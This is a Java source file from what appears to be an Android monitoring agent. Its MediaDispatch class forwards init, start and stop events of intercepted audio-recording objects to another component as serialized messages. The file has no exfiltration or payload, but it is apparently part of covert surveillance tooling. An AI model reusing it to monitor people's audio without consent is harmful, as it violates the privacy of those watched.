package com.android.dvci.event.LowEvent;

import android.app.Application;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEventMsg;

import static com.android.dvci.util.LowEventMsg.getCurrentApplication;

/**
 * Created by zad on 12/06/15.
 */
public class MediaDispatch {

	private static final String TAG = "MediaDispatch";
	static LowEventMsg obj_start = new LowEventMsg();
	static LowEventMsg obj_stop = new LowEventMsg();

	static void audioRecordStart(Object audioRecord) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "(audioRecordStart): called by " + audioRecord.getClass());//$NON-NLS-1$
		}
		try {
			AudioEvent ae = new AudioEvent(AudioEvent.AUDIO_REC_START, audioRecord.getClass().getName());
			obj_start.data = (java.io.Serializable) ae;
			obj_start.type = LowEventMsg.EVENT_TYPE_AUDIO;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStart): sendSerialObj ");//$NON-NLS-1$
			}
			obj_start = LowEventMsg.sendSerialObj(obj_start, "audioRecordStart");
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStart): called ");//$NON-NLS-1$
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStart): exception ", e);//$NON-NLS-1$
			}
		}
	}
	static void audioRecordInit(Object audioRecord) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "(audioRecordInit): called by " + audioRecord.getClass());//$NON-NLS-1$
		}
		try {
			AudioEvent ae = new AudioEvent(AudioEvent.AUDIO_REC_INIT, audioRecord.getClass().getName());
			obj_start.data = ae;
			obj_start.type = LowEventMsg.EVENT_TYPE_AUDIO;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordInit): sendSerialObj ");//$NON-NLS-1$
			}
			obj_start = LowEventMsg.sendSerialObj(obj_start, "audioRecordInit");
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordInit): called ");//$NON-NLS-1$
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordInit): exception ", e);//$NON-NLS-1$
			}
		}
	}

	static void audioRecordStop(Object audioRecord){

		if (Cfg.DEBUG) {
			Check.log(TAG + "(audioRecordStop): called by " + audioRecord.getClass());//$NON-NLS-1$
		}
		AudioEvent ae = new AudioEvent(AudioEvent.AUDIO_REC_STOP, audioRecord.getClass().getName());
		try {
			obj_stop.data = (java.io.Serializable) ae;
			obj_stop.type = LowEventMsg.EVENT_TYPE_AUDIO;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStop): sendSerialObj ");//$NON-NLS-1$
			}
			obj_stop = LowEventMsg.sendSerialObj(obj_stop, "audioRecordStop");
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStop): called ");//$NON-NLS-1$
			}
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(audioRecordStop): exception ",e);//$NON-NLS-1$
			}
		}
	}

}
